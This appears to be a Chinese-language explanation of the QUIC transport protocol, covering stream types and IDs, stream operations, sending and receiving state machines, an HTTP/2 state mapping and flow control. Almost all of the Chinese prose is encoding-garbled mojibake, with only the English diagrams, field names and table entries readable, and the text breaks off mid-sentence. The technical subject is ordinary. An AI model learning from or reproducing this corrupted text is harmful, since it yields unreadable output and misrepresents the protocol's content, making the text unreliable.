è¾“ä»è€Œèƒ½å¤Ÿæ›´å¥½åœ°æ”¯æŒç°æœ‰çš„ç³»ç»ŸåŠç½‘ç»œç¯å¢ƒã€‚\nåº”ç”¨å±‚åè®®é€šè¿‡æµåœ¨QUICè¿æ¥ä¸Šäº¤æ¢ä¿¡æ¯ï¼Œæ¯æ¡æµéƒ½æ˜¯æœ‰åºçš„å­—èŠ‚åºåˆ—ã€‚æµçš„ç±»å‹åˆ†ä¸¤ç§ï¼šåŒå‘æµï¼Œæ”¯æŒåŒç«¯å‘é€æ•°æ®ï¼›ä»¥åŠå•å‘æµï¼Œåªæ”¯æŒä¸€ç«¯å‘é€æ•°æ®ã€‚QUICä½¿ç”¨ä¸€ç§åŸºäºé¢åº¦çš„æ–¹æ¡ˆæ¥é™åˆ¶æµçš„åˆ›å»ºä»¥åŠæ¯æ¡æµå¯ä»¥å‘é€çš„æ•°æ®é‡ã€‚\nQUICä»¥æä¾›å¿…è¦åé¦ˆçš„æ–¹å¼å®ç°å¯é ä¼ è¾“åŠæ‹¥å¡æ§åˆ¶ï¼Œã€ŠQUICæ¢å¤ã€‹ç¬¬6ç« æè¿°äº†QUICçš„ä¸€ç§æ•°æ®ä¸¢å¤±åŠæ¢å¤ç®—æ³•ï¼›QUICé€šè¿‡æ‹¥å¡æ§åˆ¶é¿å…ç½‘ç»œæ‹¥å¡ï¼Œã€ŠQUICæ¢å¤ã€‹ç¬¬7ç« æè¿°äº†QUICçš„ä¸€ç§å…¸å‹æ‹¥å¡æ§åˆ¶ç®—æ³•ã€‚\nQUICè¿æ¥ä¸ä¼šä¸¥æ ¼é™åˆ¶åœ¨ä¸€æ¡å•ç‹¬çš„ç½‘ç»œé€šé“ä¸Šã€‚è¿æ¥è¿ç§»æ ¹æ®è¿æ¥æ ‡è¯†ç¬¦å°†è¿æ¥è¿ç§»åˆ°ä¸€ä¸ªæ–°çš„ç½‘ç»œé€šé“ä¸Šã€‚å½“å‰ç‰ˆæœ¬QUICåªæ”¯æŒå®¢æˆ·ç«¯è¿›è¡Œè¿æ¥è¿ç§»ã€‚åœ¨æ”¹å˜ç½‘ç»œæˆ–åœ°å€æ˜ å°„â€”â€”å¦‚NATé‡å®šå‘â€”â€”åï¼Œè¿™ä¸ªè®¾è®¡ä½¿è¿æ¥ä»ç„¶èƒ½å¤Ÿç»§ç»­ä¸‹å»è€Œä¸ä¼šæ–­å¼€ã€‚\næœ‰å¤šç§æ–¹å¼å¯ä»¥å…³é—­è¿æ¥ã€‚åº”ç”¨ç¨‹åºå¯ä»¥å¹³æ»‘å…³é—­è¿æ¥ï¼›åŒç«¯å¯ä»¥åå•†ä¸€ä¸ªè¶…æ—¶æ—¶é—´æ®µåœ¨è¶…æ—¶åå…³é—­è¿æ¥ï¼›è§¦å‘é”™è¯¯èƒ½å¤Ÿç«‹å³æ–­å¼€è¿æ¥ï¼›ä¸€ç«¯å¤±å»çŠ¶æ€åä¹Ÿèƒ½é€šè¿‡ä¸€ç§æ— çŠ¶æ€æœºåˆ¶å…³é—­è¿æ¥ã€‚\næ–‡æ¡£ç»“æ„\næµæ˜¯QUICæ”¯æŒçš„åŸºæœ¬æœåŠ¡æŠ½è±¡å±‚ã€‚\nç¬¬2ç« æè¿°æµç›¸å…³çš„æ ¸å¿ƒæ¦‚å¿µï¼Œ ç¬¬3ç« æä¾›ä¸€ä¸ªæµçŠ¶æ€çš„å‚è€ƒæ¨¡å‹ï¼Œ ç¬¬4ç« æ¦‚è¿°æµé‡æ§åˆ¶çš„è¿‡ç¨‹ã€‚ è¿æ¥æ˜¯QUICç»ˆç«¯äº¤æµçš„ä¸Šä¸‹æ–‡ã€‚\nç¬¬5ç« æè¿°è¿æ¥ç›¸å…³çš„æ ¸å¿ƒæ¦‚å¿µï¼Œ ç¬¬6ç« æè¿°ç‰ˆæœ¬åå•† ç¬¬7ç« è¯¦ç»†æè¿°è¿æ¥å»ºç«‹çš„è¿‡ç¨‹ï¼Œ ç¬¬8ç« æè¿°åœ°å€éªŒè¯åŠå±é™©çš„æ‹’ç»æœåŠ¡è¿ç§»æ”»å‡»ï¼Œ ç¬¬9ç« æè¿°ç»ˆç«¯å¦‚ä½•å°†ä¸€ä¸ªè¿æ¥è¿ç§»åˆ°æ–°çš„ç½‘ç»œé€šé“ä¸Šï¼Œ ç¬¬10ç« åˆ—ä¸¾å…³é—­ä¸€ä¸ªå·²æ‰“å¼€è¿æ¥çš„å„ä¸ªæ–¹å¼ï¼Œä»¥åŠ ç¬¬11ç« ç»™æµä¸è¿æ¥é”™è¯¯å¤„ç†æä¾›æŒ‡å¯¼ã€‚ æ•°æ®åŒ…å’Œå¸§æ˜¯QUICäº¤æµçš„åŸºæœ¬å•å…ƒã€‚\nç¬¬12ç« æè¿°æ•°æ®åŒ…ä¸å¸§ç›¸å…³çš„æ¦‚å¿µï¼Œ\nç¬¬13ç« å®šä¹‰æ•°æ®ä¼ è¾“ã€é‡ä¼ å’Œç¡®è®¤çš„æ¨¡å‹ï¼Œä»¥åŠ\nç¬¬14ç« æè¿°æŒ‡å®šæºå¸¦QUICæ•°æ®åŒ…çš„æ•°æ®æŠ¥å¤§å°çš„è§„åˆ™ã€‚\næœ€åï¼ŒQUICåè®®è¦ç´ çš„ç¼–ç ç»†èŠ‚æè¿°åœ¨ï¼š\nç¬¬15ç« ç‰ˆæœ¬ï¼Œ ç¬¬16ç« æ•´å‹ç¼–ç ï¼Œ ç¬¬17ç« æ•°æ®åŒ…å¤´éƒ¨ï¼Œ ç¬¬18ç« ä¼ è¾“å‚æ•°ï¼Œ ç¬¬19ç« å¸§ï¼Œä»¥åŠ ç¬¬20ç« é”™è¯¯ã€‚ å¸¸ç”¨æœ¯è¯­ï¼š\nQUICï¼šæœ¬æ–‡æè¿°çš„ä¼ è¾“åè®®ã€‚QUICæ˜¯åç§°ï¼Œä¸æ˜¯é¦–å­—æ¯ç¼©å†™ã€‚\nç»ˆç«¯ï¼ˆEndpointï¼‰ï¼šä¸€ä¸ªèƒ½å¤Ÿä»¥åˆ›å»ºã€æ¥æ”¶åŠå¤„ç†QUICæ•°æ®åŒ…å‚ä¸QUICè¿æ¥çš„å®ä½“ã€‚QUICç»ˆç«¯æœ‰ä¸¤ç§ç±»å‹ï¼šå®¢æˆ·ç«¯ï¼ˆclientï¼‰åŠæœåŠ¡ç«¯ï¼ˆserverï¼‰ã€‚\nQUICæ•°æ®åŒ…ï¼šQUICçš„ä¸€ä¸ªå¯ä»¥å°è£…è¿›UDPæŠ¥æ–‡ä¸­çš„å®Œæ•´å¤„ç†å•å…ƒã€‚å•ä¸ªUDPæŠ¥æ–‡å¯ä»¥å°è£…è¿›ä¸€ä¸ªæˆ–å¤šä¸ªQUICæ•°æ®åŒ…ã€‚\nACKè§¦å‘åŒ…ï¼šä¸€ä¸ªåŒ…å«é™¤ç¡®è®¤å¸§ï¼ˆACKï¼‰ã€å¡«å……å¸§ï¼ˆPADDINGï¼‰åŠè¿æ¥å…³é—­å¸§ï¼ˆCONNECTION_CLOSEï¼‰å¤–çš„å¸§çš„QUICæ•°æ®åŒ…ã€‚æ¥æ”¶æ–¹æ”¶åˆ°è¿™ç±»åŒ…ä¼šå‘ç¡®è®¤ï¼Œè¯¦è§ç¬¬13.2.1ç« ã€‚\nå¸§ï¼šä¸€ä¸ªç»“æ„åŒ–çš„åè®®ä¿¡æ¯å•å…ƒã€‚å¸§æœ‰å¤šç§ç±»å‹ï¼Œä¸åŒç±»å‹çš„å¸§æºå¸¦ä¸åŒç±»å‹çš„ä¿¡æ¯ã€‚å¸§ç”±QUICæ•°æ®åŒ…æ‰¿è½½ã€‚\nåœ°å€ï¼šå½“ä½¿ç”¨ä¸å—é™åˆ¶ï¼Œç”±IPç‰ˆæœ¬ã€IPåœ°å€åŠUDPç«¯å£å·æ„æˆçš„å…ƒç»„è¡¨ç¤ºç½‘ç»œé€šé“çš„ä¸€ç«¯ã€‚\nè¿æ¥IDï¼šç»ˆç«¯ç”¨æ¥æ ‡è¯†ä¸€æ¡QUICè¿æ¥çš„æ ‡è¯†ç¬¦ã€‚æ¯ä¸ªç»ˆç«¯é€‰æ‹©ä¸€ä¸ªæˆ–å¤šä¸ªè¿æ¥IDï¼Œä»è€Œåœ¨å¯¹ç«¯å‘é€ç»™æœ¬ç«¯çš„QUICåŒ…ä¸­åŒ…å«è¿™äº›è¿æ¥IDã€‚è¯¥å€¼å¯¹å¯¹ç«¯æ˜¯ä¸é€æ˜çš„ã€‚\næµï¼šQUICè¿æ¥ä¸Šä¸€ä¸ªå•å‘æˆ–åŒå‘çš„æœ‰åºå­—èŠ‚é€šé“ã€‚ä¸€ä¸ªQUICè¿æ¥å¯ä»¥åŒæ—¶æ‰¿è½½å¤šæ¡æµã€‚\nåº”ç”¨ï¼šä¸€ä¸ªä½¿ç”¨QUICå‘é€åŠæ¥æ”¶æ•°æ®çš„å®ä½“\nå­—æ®µä¿¡æ¯è¡¨è¿°åŒRFC8999\nç¤ºä¾‹ç»“æ„ä½“\n1 2 3 4 5 6 7 8 9 10 11 Example Structure { One-bit Field (1), 7-bit Field with Fixed Value (7) = 61, Field with Variable-Length Integer (i), Arbitrary-Length Field (..), Variable-Length Field (8..24), Field With Minimum Length (16..), Field With Maximum Length (..128), [Optional Field (64)], Repeated Field (8) ..., } 0x2ã€æµ æµIDçš„æœ€å°æœ‰æ•ˆä½ï¼ˆ0x01ï¼‰æ ‡è¯†æµçš„å‘èµ·è€…ã€‚å®¢æˆ·ç«¯å‘èµ·çš„æµçš„IDæ˜¯å¶æ•°ï¼ˆè¯¥ä½è¢«ç½®ä¸º0ï¼‰ï¼ŒæœåŠ¡ç«¯å‘èµ·çš„æµçš„IDæ˜¯å¥‡æ•°ï¼ˆè¯¥ä½è¢«ç½®ä¸º1ï¼‰ã€‚\næµIDçš„æ¬¡å°æœ‰æ•ˆä½ï¼ˆ0x02ï¼‰æ ‡è¯†æµæ˜¯åŒå‘æµï¼ˆè¯¥ä½è¢«ç½®ä¸º0ï¼‰æŠ‘æˆ–å•å‘æµï¼ˆè¯¥ä½è¢«ç½®ä¸º1ï¼‰ã€‚\nä½ æµç±»å‹ 0x00 å®¢æˆ·ç«¯åˆ›å»ºçš„åŒå‘æµ 0x01 æœåŠ¡ç«¯åˆ›å»ºçš„åŒå‘æµ 0x02 å®¢æˆ·ç«¯åˆ›å»ºçš„å•å‘æµ 0x03 æœåŠ¡ç«¯åˆ›å»ºçš„å•å‘æµ è¡¨æ ¼1ï¼šæµç±»å‹\næ¯ç§æµç±»å‹çš„æµç©ºé—´ä»å…¶æœ€å°å€¼å¼€å§‹ï¼ˆä¾æ¬¡ä»0x00åˆ°0x03ï¼‰ï¼›æ¯ç§æµçš„æ¯ä¸ªæµIDæ ¹æ®åˆ›å»ºé¡ºåºä¾æ¬¡çº¿æ€§é€’å¢ã€‚å¦‚æœä¸æŒ‰é¡ºåºåœ°ä½¿ç”¨äº†ä¸€ä¸ªæµIDï¼Œå°†å¯¼è‡´ç›¸åŒæµç±»å‹çš„æ‰€æœ‰å…·æœ‰æ›´å°çš„æµIDçš„æµéƒ½è¢«å¼€å¯ã€‚\nç»ˆç«¯å¯ä»¥ä»ä¸€æ¡æµçš„åŒä¸€ä¸ªåç§»ä½ç½®å¤šæ¬¡æ¥æ”¶æ•°æ®ã€‚å¦‚æœæ•°æ®å·²ç»è¢«æ¥æ”¶è¿‡äº†ï¼Œå°±å¯ä»¥ç›´æ¥è¢«ä¸¢å¼ƒã€‚\n0x24ã€æµæ“ä½œ æœ¬æ–‡æ²¡æœ‰å®šä¹‰QUIC APIï¼Œè€Œæ˜¯å®šä¹‰äº†ä¸€ç³»åˆ—æµæ“ä½œç›¸å…³çš„å‡½æ•°å¯ä»¥ç”¨äºåº”ç”¨å±‚åè®®çš„æ„å»ºã€‚åº”ç”¨å±‚åè®®å¯ä»¥å‡å®šQUICæœ‰å…³å®ç°æä¾›äº†æœ¬ç« æè¿°çš„æ“ä½œå¯¹åº”çš„æ¥å£ã€‚ä¸ºä¸€ä¸ªç‰¹å®šåº”ç”¨å±‚åè®®è®¾è®¡å®ç°çš„QUICåè®®å¯èƒ½ä»…ä»…æä¾›è¯¥åè®®éœ€è¦çš„è¿™äº›æ“ä½œã€‚\nåœ¨æµçš„å‘é€éƒ¨åˆ†ï¼Œåº”ç”¨å±‚åè®®å¯ä»¥ï¼š\nå†™æ•°æ®ï¼Œåªæœ‰å½“æµé‡æ§åˆ¶ç»™æ•°æ®å†™å‡ºç•™è¶³ç©ºé—´ï¼ˆç¬¬4.1ç« ï¼‰æ‰èƒ½æˆåŠŸå†™å‡ºï¼› ç»“æŸæµï¼ˆæ¸…ç†å¹¶å…³é—­ï¼‰ï¼Œå‘é€ä¸€ä¸ªè®¾ç½®FINä½ä¸º1çš„æµå¸§ï¼ˆç¬¬19.8ç« ï¼‰ï¼› é‡ç½®æµï¼ˆä¸­æ­¢å¹¶å…³é—­ï¼‰ï¼Œå½“æµæœªå¤„åœ¨ç»ˆæ­¢çŠ¶æ€æ—¶å‘é€ä¸€ä¸ªRESET_STREAMå¸§ï¼ˆç¬¬19.4ç« ï¼‰ã€‚ åœ¨æµçš„æ¥æ”¶éƒ¨åˆ†ï¼Œåº”ç”¨å±‚åè®®å¯ä»¥ï¼š\nè¯»æ•°æ®ï¼Œä»¥åŠ ä¸­æ­¢è¯»å–æµæ•°æ®å¹¶è¯·æ±‚å…³é—­æµï¼Œè¯¥æ“ä½œå¯èƒ½éœ€è¦å‘é€STOP_SENDINGå¸§ï¼ˆç¬¬19.5ç« ï¼‰ã€‚ åº”ç”¨å±‚åè®®ä¹Ÿå¯ä»¥è¯·æ±‚åœ¨æµçŠ¶æ€æ”¹å˜çš„æ—¶å€™æ”¶åˆ°é€šçŸ¥ä¿¡æ¯ï¼ŒåŒ…æ‹¬å½“å¯¹ç«¯å¼€å¯æˆ–é‡ç½®æµã€å¯¹ç«¯ä¸­æ­¢æµæ•°æ®è¯»å–ã€æœ‰æ–°æ•°æ®å¯ä»¥è¯»å–ã€ä»¥åŠæ•°æ®å¯ä»¥å†™å‡ºæˆ–å› æµæ§ä¸èƒ½å†™å‡ºã€‚\n0x3ã€æµçŠ¶æ€ æœ¬ç« æè¿°æµçš„å‘é€åŠæ¥æ”¶ç›¸å…³ç»„ä»¶ã€‚æœ‰ä¸¤ä¸ªçŠ¶æ€æœºéœ€è¦æè¿°ï¼šä¸€ä¸ªæ˜¯å…³äºç»ˆç«¯ä¼ è¾“æ•°æ®ï¼ˆç¬¬3.1ç« ï¼‰çš„æµï¼Œå¦ä¸€ä¸ªæ˜¯å…³äºç»ˆç«¯æ¥æ”¶æ•°æ®ï¼ˆç¬¬3.2ç« ï¼‰çš„æµã€‚\nå•å‘æµç”¨åˆ°å‘é€æˆ–æ¥æ”¶çš„å…¶ä¸­ä¸€ä¸ªçŠ¶æ€æœºï¼Œå–å†³äºæµç±»å‹åŠç»ˆç«¯è§’è‰²ã€‚åŒå‘æµåŒç«¯éƒ½ä¼šç”¨åˆ°ä¸¤ä¸ªçŠ¶æ€æœºã€‚åœ¨æå¤§ç¨‹åº¦ä¸Šï¼Œä¸è®ºå•å‘æµè¿˜æ˜¯åŒå‘æµï¼Œåœ¨ä½¿ç”¨è¿™ä¸¤ä¸ªçŠ¶æ€æœºä¸Šæ˜¯æ²¡æœ‰åŒºåˆ«çš„ã€‚ç›¸å¯¹è€Œè¨€æ‰“å¼€ä¸€æ¡åŒå‘æµä¼šç¨å¾®å¤æ‚ä¸€äº›ï¼Œå› ä¸ºåŒæ—¶æ‰“å¼€å‘é€å’Œæ¥æ”¶ç«¯æ„å‘³ç€åœ¨ä¸¤ä¸ªæ–¹å‘ä¸ŠåŒæ—¶æ‰“å¼€æµã€‚\næœ¬ç« å±•ç¤ºçš„çŠ¶æ€æœºæå…·ä¿¡æ¯é‡ã€‚æœ¬æ–‡ä½¿ç”¨æµçŠ¶æ€æè¿°ä¸åŒç±»å‹å¸§åœ¨ä½•æ—¶ä»¥ä½•ç§æ–¹å¼å‘é€çš„ç›¸å…³è§„åˆ™ï¼Œä»¥åŠå½“æ”¶åˆ°ä¸åŒç±»å‹çš„å¸§æ—¶åº”ä½œå‡ºçš„ååº”ã€‚å³ä½¿è¿™äº›çŠ¶æ€æœºç›®çš„åœ¨äºæŒ‡å¯¼å¦‚ä½•å®ç°QUICåè®®ï¼Œä½†å…¶å¹¶ä¸æ„å‘³ç€é™åˆ¶QUICå®ç°çš„æ–¹å¼ã€‚ä¸€ä¸ªQUICå®ç°å®Œå…¨å¯ä»¥å®šä¹‰ä¸åŒçš„çŠ¶æ€æœºï¼Œåªè¦å…¶è¡Œä¸ºä¸æœ¬æ–‡æ‰€è¿°çŠ¶æ€æœºçš„å…·ä½“å®ç°ä¸€è‡´å³å¯ã€‚\n0x31ã€å‘é€æµçŠ¶æ€ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 o | Create Stream (Sending) | Peer Creates Bidirectional Stream v +-------+ | Ready | Send RESET_STREAM | |-----------------------. +-------+ | | | | Send STREAM / | | STREAM_DATA_BLOCKED | v | +-------+ | | Send | Send RESET_STREAM | | |----------------------\u0026gt;| +-------+ | | | | Send STREAM + FIN | v v +-------+ +-------+ | Data | Send RESET_STREAM | Reset | | Sent |------------------\u0026gt;| Sent | +-------+ +-------+ | | | Recv All ACKs | Recv ACK v v +-------+ +-------+ | Data | | Reset | | Recvd | | Recvd | +-------+ +-------+ 0x32ã€æ¥æ”¶æµçŠ¶æ€ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 o | Recv STREAM / STREAM_DATA_BLOCKED / RESET_STREAM | Create Bidirectional Stream (Sending) | Recv MAX_STREAM_DATA / STOP_SENDING (Bidirectional) | Create Higher-Numbered Stream v +-------+ | Recv | Recv RESET_STREAM | |-----------------------. +-------+ | | | | Recv STREAM + FIN | v | +-------+ | | Size | Recv RESET_STREAM | | Known |----------------------\u0026gt;| +-------+ | | | | Recv All Data | v v +-------+ Recv RESET_STREAM +-------+ | Data |--- (optional) ---\u0026gt;| Reset | | Recvd | Recv All Data | Recvd | +-------+\u0026lt;-- (optional) ----+-------+ | | | App Read All Data | App Read Reset v v +-------+ +-------+ | Data | | Reset | | Read | | Read | +-------+ +-------+ ç»ˆç«¯åœ¨æ”¶åˆ°æœ€å¤§æµæ•°æ®å¸§æˆ–åœæ­¢å‘é€å¸§åæ‰“å¼€ä¸€æ¡åŒå‘æµã€‚æ¥æ”¶åˆ°ä¸€æ¡æœªå¼€å¯çš„æµçš„æœ€å¤§æµæ•°æ®å¸§æ„å‘³ç€å¯¹ç«¯å·²ç»å¼€å¯äº†è¯¥æµï¼Œå¹¶å¼€å§‹æ”¯æŒæµé‡æ§åˆ¶é¢åº¦ã€‚è€Œæ¥æ”¶åˆ°ä¸€æ¡æœªå¼€å¯æµçš„åœæ­¢å‘é€å¸§æ„å‘³ç€å¯¹ç«¯ä¸ä¼šå†ä»è¯¥æµæ¥æ”¶æ•°æ®ã€‚æ— è®ºè¿™ä¸¤ç§å¸§çš„å“ªä¸€ç§éƒ½å¯èƒ½å…ˆäºæµå¸§æˆ–æµé˜»å¡å¸§åˆ°è¾¾æœ¬ç«¯ï¼ŒåŸå› æ˜¯åŒ…ä¸¢å¤±æˆ–ä¹±åºã€‚\nåœ¨ä¸€æ¡æµåˆ›å»ºå‰ï¼Œæ‰€æœ‰æ•°å€¼å°äºè¯¥æµIDçš„åŒç±»å‹æµéƒ½å¿…é¡»è¢«åˆ›å»ºã€‚è¿™æ ·èƒ½ç¡®ä¿åŒç«¯æµçš„åˆ›å»ºæ¬¡åºä¿æŒä¸€è‡´ã€‚\nåœ¨â€œæ¥æ”¶â€çŠ¶æ€ï¼Œç»ˆç«¯æ¥æ”¶æµå¸§å’Œæµé˜»å¡å¸§ã€‚ä¼ å…¥æ•°æ®å°†è¢«ç¼“å­˜ï¼Œå¹¶å¯ä»¥æŒ‰ç…§æ­£ç¡®é¡ºåºé‡ç»„ä»¥ä¾¿é€’ç»™åº”ç”¨å±‚ã€‚éšç€åº”ç”¨å±‚ä¸æ–­æ¶ˆè€—æ•°æ®ï¼Œç¼“å†²åŒºé‡æ–°ç©ºå‡ºæ¥ï¼Œç»ˆç«¯å‘é€æœ€å¤§æµæ•°æ®å¸§å‘ŠçŸ¥å¯¹ç«¯å¯ä»¥å‘é€æ›´å¤šæ•°æ®ã€‚\nå½“æ”¶åˆ°ä¸€ä¸ªå¸¦FINç½®ä½çš„æµå¸§æ—¶ï¼Œæ•°æ®çš„æœ€ç»ˆå¤§å°ç¡®å®šä¸‹æ¥ï¼Œè¯¦è§ç¬¬4.5ç« ã€‚æµçš„æ¥æ”¶éƒ¨åˆ†éšåè½¬åˆ°â€œæ•°æ®é‡ç¡®è®¤â€çŠ¶æ€ã€‚åœ¨æ­¤çŠ¶æ€ï¼Œç»ˆç«¯ä¸å†éœ€è¦å‘é€æœ€å¤§æµæ•°æ®å¸§ï¼Œåªéœ€è¦æ¥æ”¶é‡ä¼ æ•°æ®å³å¯ã€‚\nä¸€æ—¦æ”¶å®Œäº†ä¸€æ¡æµçš„æ‰€æœ‰æ•°æ®ï¼Œæµçš„æ¥æ”¶éƒ¨åˆ†è½¬å…¥â€œæ¥æ”¶å®Œæˆâ€çŠ¶æ€ã€‚è¿™å¯èƒ½å‘ç”Ÿåœ¨æ”¶åˆ°å¯¼è‡´è½¬å…¥â€œæ•°æ®é‡ç¡®è®¤â€çŠ¶æ€çš„åŒä¸€ä¸ªæµå¸§åã€‚åœ¨æ‰€æœ‰æ•°æ®éƒ½æ”¶å®Œåï¼Œå¯ä»¥ä¸¢å¼ƒè¯¥æµçš„ä»»ä½•æµå¸§æˆ–æµé˜»å¡å¸§ã€‚\n0x33ã€Permitted Frame Types æµçš„å‘é€ç«¯å‘é€çš„å¸§åªæœ‰ä¸‰ç§èƒ½åŒæ—¶å½±å“å‘é€ç«¯å’Œæ¥æ”¶ç«¯çŠ¶æ€ï¼šSTREAMï¼ˆç¬¬19.8ç« ï¼‰ã€STREAM_DATA_BLOCKEDï¼ˆç¬¬19.13ç« ï¼‰ï¼Œä»¥åŠRESET_STREAMï¼ˆç¬¬19.4ç« ï¼‰ã€‚\næµçš„æ¥æ”¶ç«¯å‘é€MAX_STREAM_DATA framesï¼ˆç¬¬19.19ç« ï¼‰åŠSTOP_SENDING framesï¼ˆç¬¬19.5ç« ï¼‰ã€‚\n0x34ã€åŒå‘æµçŠ¶æ€ å¯èƒ½çš„å¯¹äºHTTP2çš„çŠ¶æ€æ˜ å°„ åœ¨æœ€ç®€å•çš„æ¨¡å‹é‡Œï¼Œå½“å‘é€å’Œæ¥æ”¶éƒ¨åˆ†å‡å¤„åœ¨éæœ€ç»ˆçŠ¶æ€æ—¶ï¼Œè¡¨ç¤ºæµå¤„äºâ€œæ‰“å¼€â€çŠ¶æ€ï¼›å½“ä¸¤è€…å‡å¤„äºæœ€ç»ˆçŠ¶æ€æ—¶ï¼Œè¡¨ç¤ºæµå¤„äºâ€œå…³é—­â€çŠ¶æ€ã€‚\nTable 2: Possible Mapping of Stream States to HTTP/2\nSending Part Receiving Part Composite State No Stream / Ready No Stream / Recv (*1) idle Ready / Send / Data Sent Recv / Size Known open Ready / Send / Data Sent Data Recvd / Data Read half-closed (remote) Ready / Send / Data Sent Reset Recvd / Reset Read half-closed (remote) Data Recvd Recv / Size Known half-closed (local) Reset Sent / Reset Recvd Recv / Size Known half-closed (local) Reset Sent / Reset Recvd Data Recvd / Data Read closed Reset Sent / Reset Recvd Reset Recvd / Reset Read closed Data Recvd Data Recvd / Data Read closed Data Recvd Reset Recvd / Reset Read closed 0x35ã€è¯·æ±‚çŠ¶æ€è½¬æ¢ A STOP_SENDING frame è¯·æ±‚æ¥æ”¶æ–¹å‘é€ a RESET_STREAM frame\nå¦‚æœåŒå‘æµçš„ä¸€ç«¯æƒ³è¦å°†æµçš„ä¸¤ä¸ªæ–¹å‘åŒæ—¶å…³é—­ï¼Œé‚£ä¹ˆå…¶å¯ä»¥é€šè¿‡å‘é€ä¸€ä¸ªRESET_STREAMå…³é—­ä¸€ä¸ªæ–¹å‘ï¼Œå¹¶å‘é€ä¸€ä¸ªSTOP_SENDINGä¿ƒä½¿ç›¸åæ–¹å‘ä¹Ÿè¿…é€Ÿå¾—åˆ°å…³é—­ã€‚\n0x4ã€æµé‡æ§åˆ¶ æ¥æ”¶æ–¹éœ€è¦é™åˆ¶ç¼“å­˜æ•°æ®é‡ä»¥é˜²å‘é€æ–¹é€Ÿåº¦å¤ªå¿«é€ æˆå†²å‡»æˆ–è¢«æ¶æ„å‘é€æ–¹æ¶ˆè€—å¤§é‡å†…å­˜ã€‚ä¸ºäº†è®©æ¥æ”¶æ–¹èƒ½å¤Ÿé™åˆ¶è¿æ¥çš„å†…å­˜å ç”¨ï¼Œä¸ä»…æ¯æ¡æµæœ‰å•ç‹¬çš„æµé‡æ§åˆ¶ï¼Œæ‰€æœ‰æµä¹Ÿä½œä¸ºä¸€ä¸ªæ•´ä½“åœ¨è¿æ¥å±‚é¢æœ‰ç»Ÿä¸€çš„æµé‡æ§åˆ¶ã€‚QUICæ¥æ”¶æ–¹æ§åˆ¶å‘é€æ–¹åœ¨ä¸€æ¡æµä¸Šä»¥åŠä»»ä½•æ—¶åˆ»åœ¨æ‰€æœ‰æµä¸Šå¯ä»¥å‘é€çš„æœ€å¤§æ•°æ®é‡ï¼Œè¯¦è§ç¬¬4.1ç« æˆ–ç¬¬4.2ç« ã€‚\nåŒæ ·åœ°ï¼Œä¸ºäº†é™åˆ¶è¿æ¥å¹¶å‘ï¼ŒQUICç»ˆç«¯æ§åˆ¶å¯¹æ–¹å¯ä»¥åŒæ—¶å¼€å¯çš„æœ€å¤§æµæ•°é‡ï¼Œè¯¦è§ç¬¬4.6ç« ã€‚\né€šè¿‡åŠ å¯†å¸§å‘é€çš„æ•°æ®ä¸åƒæµæ•°æ®é‚£æ ·å—æµé‡æ§åˆ¶åˆ¶çº¦ã€‚QUICä¾èµ–äºåŠ å¯†åè®®çš„å®ç°æ¥é¿å…è¿™äº›æ•°æ®è¢«è¿‡é‡ç¼“å­˜ï¼Œè¯¦è§ã€ŠQUIC TLSã€‹ã€‚ä¸ºäº†é˜²æ­¢åœ¨å¤šä¸ªå±‚æ¬¡è¿‡é‡ç¼“å­˜æ•°æ®ï¼ŒQUICå®ç°åº”è¯¥ä¸ºåŠ å¯†åè®®å®ç°æä¾›ä¸€å¥—æ¥å£ä»¥ä¾›å…¶äº¤æµç¼“å­˜åŒºé™åˆ¶ã€‚\n0x41ã€æ•°æ®æµé‡æ§åˆ¶ QUICä½¿ç”¨ä¸€ä¸ªåŸºäºé™åˆ¶çš„æµé‡æ§åˆ¶æ¨¡å‹ï¼Œæ¥æ”¶è€…ç»™å‡ºå…¶å‡†å¤‡åœ¨ç»™å®šæµæˆ–æ•´ä¸ªè¿æ¥ä¸Šå‡†å¤‡æ¥æ”¶çš„æ€»å­—èŠ‚æ•°çš„ä¸Šé™ã€‚è¿™ä½¿å¾—QUICä¸­å­˜åœ¨ä¸¤å±‚æ•°æ®æµé‡æ§åˆ¶ï¼š\næµçš„æµé‡æ§åˆ¶ï¼šé€šè¿‡é™åˆ¶æ¯æ¡æµå¯ä»¥å‘é€çš„æ•°æ®é‡ï¼Œé˜²æ­¢å•æ¡æµè€—å°½ä¸€æ¡è¿æ¥çš„å…¨éƒ¨æ¥æ”¶ç¼“å†²åŒºï¼› è¿æ¥æµé‡æ§åˆ¶ï¼šé€šè¿‡é™åˆ¶æ‰€æœ‰æµç»ç”±æµå¸§å¯ä»¥å‘é€çš„æ•°æ®é‡ï¼Œé˜²æ­¢å‘é€æ–¹è¶…è¿‡è¿æ¥æ¥æ”¶æ–¹çš„ç¼“å†²åŒºå®¹é‡ã€‚ æ¥æ”¶æ–¹åœ¨æ¡æ‰‹è¿‡ç¨‹ä¸­ï¼ˆç¬¬7.4ç« ï¼‰é€šè¿‡ä¼ è¾“å‚æ•°ä¸ºæ‰€æœ‰æµè®¾ç½®åˆå§‹çš„æµæ¥æ”¶ç¼“å­˜åŒºä¸Šé™ã€‚éšåï¼Œæ¥æ”¶æ–¹å‘é€æœ€å¤§æµæ•°æ®å¸§ï¼ˆç¬¬19.10ç« ï¼‰æˆ–æœ€å¤§æ•°æ®å¸§ï¼ˆç¬¬19.9ç« ï¼‰ä»¥å‘ŠçŸ¥å¯¹æ–¹æé«˜æµæ¥æ”¶ç¼“å­˜åŒºä¸Šé™ã€‚\nå¦‚æœå‘é€æ–¹å‘é€æ•°æ®è¾¾åˆ°äº†æµé‡æ§åˆ¶ä¸Šé™ï¼Œå…¶å°†ä¸èƒ½å†å‘é€æ–°æ•°æ®ï¼Œä¸”åº”è®¤ä¸ºå…¶è¢«é˜»å¡ä½äº†ã€‚å‘é€æ–¹åº”è¯¥å‘é€ä¸€ä¸ªæµæ•°æ®é˜»å¡å¸§æˆ–æ•°æ®é˜»å¡å¸§æ¥å‘ŠçŸ¥æ¥æ”¶æ–¹å…¶æœ‰æ•°æ®è¦å†™å‡ºä½†æ˜¯è¢«æµé‡æ§åˆ¶æ‰€é˜»å¡ã€‚å¦‚æœå‘é€æ–¹è¢«é˜»å¡çš„æ—¶é—´è¶…è¿‡ç©ºç­‰è¶…æ—¶æ—¶é—´ï¼ˆç¬¬10.1ç« ï¼‰ï¼Œæ¥æ”¶æ–¹å¯ä»¥å…³é—­è¿æ¥ï¼Œå³ä¾¿å‘é€æ–¹æœ‰å¯ä¼ 